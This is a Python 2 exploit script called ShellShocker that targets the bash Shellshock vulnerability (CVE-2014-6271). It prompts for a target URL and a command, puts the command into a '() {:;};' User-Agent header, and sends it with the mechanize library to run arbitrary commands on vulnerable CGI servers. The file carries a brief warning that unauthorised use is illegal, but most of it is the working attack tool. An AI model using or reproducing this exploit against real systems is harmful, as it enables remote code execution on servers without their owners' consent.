#! /usr/bin/python
#qpy:console

####################################         /&/
# ShellShocker  ::     ##########            ! &
# Shellshock bug       ###############     #/!!/
# exploit              ########                   # 
#  ...HackYoUrMind...  ############           #/
# CVE-2014-6271 (Main) ########
#################################                  #

# Stefano Belli <stefano9913@gmail.com> ][ Google+ : <http://plus.google.com/+StefanoBelli>
# Last updated: [DD/MM/YYYY] 11/12/2014, [HH/MM] 00:10 AM
# Status: initial release
# support: posix (Unix) / Windows may require Cygwin[BATCH NOT SUPPORTED] due to unsupported things. Program runs.
# Be free! Open Source <(C)
# Version: 1.0rev2
# Status: WORKING

##
# TO-DO: -add exception: mechanize._response.httperror_seek_wrapper "attacker()"
#        - handling robots.txt
#        - add keyboardInterrupt for "retryIfNotReachable" 
##

#Modules
import os
import sys

# Sys.Argv -- argument parser
len(sys.argv)

#variables!
_licence_ = '''
\033[33mShellShocker <(C) | WARNING
========================================
Be free, but remember that this is a pentest tool
should be used for TEST your systems, i assume no
responsibility ! :D
Exploiting remote machines, WITHOUT administrator/owner
knownledge, is ILLEGAL.
Think before attack your target!

i ADVIDSED you.

:::.::.:::.::.:..::.::::.....:::..:::.
========================================\033[0m
'''
version = "1.0rev2"
status = "Working"

__main__ = '''
ShellShocker <(C) | Exploit (Shell)

\033[31m #####                               #####                              
#     # #    # ###### #      #      #     # #    #  ####   ####  #    # (er)
#       #    # #      #      #      #       #    # #    # #    # #   #  
 #####  ###### #####  #      #       #####  ###### #    # #      ####   
      # #    # #      #      #            # #    # #    # #      #  #   
#     # #    # #      #      #      #     # #    # #    # #    # #   #  
 #####  #    # ###### ###### #####term#  #####  #    #  ####   ####  #    # \033[0m
                                            Shell-Shock(er)                          

      /* Bash Shocked */
      Vulnerability: \033[32mCVE-2014-6271\033[0m
      Warning: \033[31m10/10 [!!]\033[0m
      Exploit type: \033[31mArbitrary code execution\033[0m
      Vulnerable: \033[33mCGI-BIN is vulnerable ( if bash shell handles request), DHCP Server and more.\033[0m
      Fixed: \033[32mYes\033[0m

      \033[32mPython 2.7
      =>Requires
        -mechanize
        -os
        -sys\033[0m

      \033[34mDeveloper: Stefano Belli (--developer for more info(s) )
      Script version: %s
      GitHub: <http://github.com/StefanoBelli/shellshocker-python>Term
      Last updated: 11/12/2014 [DD/MM/YYYY] @ 00:10 PM\033[0m

Usage: shellshocker.py \033[33m<option>

options: --licence
         --developer\033[0m
      

''' %version



_developer_ = '''
\033[34mShellShocker <(C) | Developer
=========================================
Stefano Belli,
EMail: <stefano9913@gmail.com>
Google+: <plus.google.com/+StefanoBelli>
Twitter: <@S73FYH4CK>
GitHub: <http://github.com/StefanoBelli>
++++++++++++++++++++++++++++++++++++++++++\033[0m
'''

exitValue = 0
currentDir = os.getcwd()
__welcome__ = '''
ShellShocker <(C) | Restart
<=======================>
Welcome to ShellShocker
restart by: %s
<=======================>'''%currentDir

_retry_ = '''
========================
'''



#Argument 
for arg in sys.argv:
    if arg == "--licence":
        os.system("clear")
        print ""
        print(_licence_)
        print ""
        exit(0)
    elif arg == "--developer":
	os.system("clear")
	print ""
        print (_developer_)
        print ""
	exit(0)
  
        

################################ GO!
try:
    #Check if mechanize is installed, if not let the user choose if he/she(dreams :D ) wants to get it
    import mechanize
except ImportError:
    os.system("clear")
    print("\033[33m{!} Import error: mechanize libs are not installed!")
    #Package manager chooser, install mechanize automatically if not availible (ImportError Exception)
    outOrGet = raw_input("{?} Do you want to exit or get mechanize[e/M]: ")
    if outOrGet == 'e':
        exit(1)
        exitValue = 1
	print("Bye\033[0m")
    elif outOrGet == 'm':
        packageManager = raw_input("{?} What package manager are you using?[apt/yum]: ")
        if packageManager == 'apt':
            try:
                os.system("apt-get install python-mechanize")
                os.system("clear")
                print(__welcome__)
		exit(0)
            except KeyboardInterrupt:
                os.system("clear")
                print("\n{!} Quitted by Keyboard Shortcut\n\n")
                exit(0)
            
        elif packageManager == 'yum':
            try:
                os.system("yum install python-mechanize")
                os.system("clear")
                print(__welcome__)
                exit(0) 
            except KeyboardInterrupt:
                os.system("clear")
                print("\n{!} Quitted by Keyboard Shortcut\n\n")
                exit(0)
            
        else:
            print("\033[31m{!} Other package managers are not supported! (Wait until support comes...) \033[0m")
            exitValue = 1
            exit(1)

    #Check for Android 
    try:
        import androidhelper
    except ImportError:
        print("[!} Supporting Android by QPython ~ TextualShell\n")
        pass
    else:
        exit(1)
#Define mechanize values
def defineMechanize():
    global br
    try:
        br = mechanize.Browser()
    except NameError:
        if exitValue == 0:
            pass
        elif exitValue == 1:
            print("{\033[32minfo\033[0m} Bye!")
            exit(1)
    br.addheaders = [('User-agent', '() {:;}; %s'%getCommand)]
    
#Main screen 
def mainChooser():
    global getTarget
    global getCommand
    try:
        os.system("clear")
        print(__main__)
        getTarget = raw_input("\033[33m{?/!}sskr:type-Target# \033[0m")
        print("\033[32m{!!} Target: %s\033[0m"%getTarget)
        print("")
        getCommand = raw_input("\033[33m{?/!!}sskr:type-Command# \033[0m")
        print("\033[32m{!!} Command: %s\033[0m"%getCommand)
    except KeyboardInterrupt:
        print("\n\033[33m{!} User quitted (while get data) \033[0m")
        exit(0)
    except SyntaxError:
        print("\033[31m{!} Dev error! submit this error: mainChooser() SyntaxError [[ See my email address for more info (call --developer)\033[0m")
        exit(0)

#Attack
def attacker():
    try:
        print ""
        print("\033[31m{!!} All data acquired... Calling %s\033[0m"%getTarget)
        br.open(getTarget)
        response = br.response()
        if response:
            print("\033[32m{+} Command: "%getCommand+" executed."%getTarget+" Was reachable\033[0m")
            exit(0)
        else:
            print("\033[31m{!} Error(s) happened, but maybe command was executed by bash shell\033[0m")
            print("\033[31mI cannot reach ERROR/EXCEPTION.\033[0m")
            exit(0)
            
    except KeyboardInterrupt:
        print("\033[33m{!} User quitted [function: attacker() ]")
        exit(0)
    except mechanize._mechanize.BrowserStateError:
        print("\033[31m{!} I cannot reach website.\033[0m")
        retryOrNot = raw_input("\033[33m{?} Would you like to get back for retry?[Y/n]: \033[0m")
        if retryOrNot == 'y':
            os.system("clear")
            print (_retry_)
            mainChooser()
            defineMechanize()
            attacker()
        else:
            print("Bye bye!\nAnd remember... \033[31mW00t W00t i got r00t!\033[0m")
            exit(0)
            
####EXECUTE####
mainChooser()     
defineMechanize()  
attacker()         
###############